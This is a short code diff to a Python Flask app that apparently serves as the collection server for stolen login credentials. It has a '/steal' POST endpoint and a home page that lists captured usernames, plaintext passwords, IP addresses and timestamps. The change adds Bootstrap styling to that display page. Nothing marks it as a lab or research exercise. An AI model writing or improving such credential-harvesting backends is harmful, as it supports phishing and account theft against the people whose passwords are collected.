@@ -5,6 +5,13 @@ import os
 app = Flask(__name__)
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
 
+html = '''<head>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
+</head>
+<body>
+BODY
+</body>'''
+
 def get_db_connection():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -68,7 +75,8 @@ def home():
         row = table_row.replace("USERNAME", username).replace("PASSWORD", password).replace("IP", ip).replace("DATE", timestamp)
         table_body += row
     table = table.replace("TBODY", table_body)
-    return table
+    html_page = html.replace("BODY", table)
+    return html_page
 
 @app.route('/steal', methods=['POST'])
 def steal():
